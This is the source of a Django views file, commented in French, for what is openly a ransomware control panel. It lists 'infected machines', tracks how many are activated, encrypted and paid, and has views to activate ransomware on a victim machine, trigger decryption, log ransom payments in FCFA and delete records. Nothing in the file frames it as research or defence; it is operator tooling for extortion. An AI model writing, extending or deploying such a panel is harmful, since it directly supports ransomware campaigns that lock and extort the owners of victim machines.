"""
Views pour le dashboard de contrôle
"""

from django.shortcuts import render, get_object_or_404, redirect
from django.contrib import messages
from django.utils import timezone
from .models import InfectedMachine, StatusLog

def dashboard_home(request):
    """Page d'accueil du dashboard"""
    
    machines = InfectedMachine.objects.all()
    
    # Statistiques
    total_machines = machines.count()
    active_machines = machines.filter(is_activated=True).count()
    encrypted_machines = machines.filter(is_encrypted=True).count()
    paid_machines = machines.filter(payment_received=True).count()
    
    context = {
        'machines': machines,
        'total_machines': total_machines,
        'active_machines': active_machines,
        'encrypted_machines': encrypted_machines,
        'paid_machines': paid_machines,
    }
    
    return render(request, 'dashboard/home.html', context)


def machine_detail(request, machine_id):
    """Détails d'une machine spécifique"""
    
    machine = get_object_or_404(InfectedMachine, machine_id=machine_id)
    logs = machine.logs.all()[:50]  # 50 derniers logs
    
    context = {
        'machine': machine,
        'logs': logs,
    }
    
    return render(request, 'dashboard/machine_detail.html', context)


def activate_machine(request, machine_id):
    """Active le ransomware sur une machine"""
    
    machine = get_object_or_404(InfectedMachine, machine_id=machine_id)
    
    if not machine.is_activated:
        machine.activate()
        
        # Créer un log
        StatusLog.objects.create(
            machine=machine,
            status="ACTIVATED",
            details="Ransomware activé depuis le dashboard"
        )
        
        messages.success(request, f"Ransomware activé sur {machine.hostname}")
    else:
        messages.warning(request, f"Le ransomware est déjà activé sur {machine.hostname}")
    
    return redirect('machine_detail', machine_id=machine_id)


def decrypt_machine(request, machine_id):
    """Déclenche le déchiffrement sur une machine"""
    
    machine = get_object_or_404(InfectedMachine, machine_id=machine_id)
    
    if machine.is_encrypted and not machine.is_decrypted:
        machine.decrypt()
        
        # Créer un log
        StatusLog.objects.create(
            machine=machine,
            status="DECRYPTION_TRIGGERED",
            details="Déchiffrement déclenché depuis le dashboard"
        )
        
        messages.success(request, f"Déchiffrement lancé sur {machine.hostname}")
    else:
        messages.warning(request, "Impossible de déclencher le déchiffrement")
    
    return redirect('machine_detail', machine_id=machine_id)


def mark_payment(request, machine_id):
    """Marque le paiement comme reçu"""
    
    if request.method == 'POST':
        machine = get_object_or_404(InfectedMachine, machine_id=machine_id)
        
        amount = request.POST.get('amount', 0)
        proof = request.POST.get('proof', '')
        
        machine.mark_payment(amount, proof)
        
        # Créer un log
        StatusLog.objects.create(
            machine=machine,
            status="PAYMENT_RECEIVED",
            details=f"Paiement de {amount} FCFA reçu"
        )
        
        messages.success(request, f"Paiement enregistré pour {machine.hostname}")
        
        return redirect('machine_detail', machine_id=machine_id)
    
    return redirect('dashboard_home')


def delete_machine(request, machine_id):
    """Supprime une machine de la base de données"""
    
    machine = get_object_or_404(InfectedMachine, machine_id=machine_id)
    hostname = machine.hostname
    machine.delete()
    
    messages.info(request, f"Machine {hostname} supprimée")
    
    return redirect('dashboard_home')
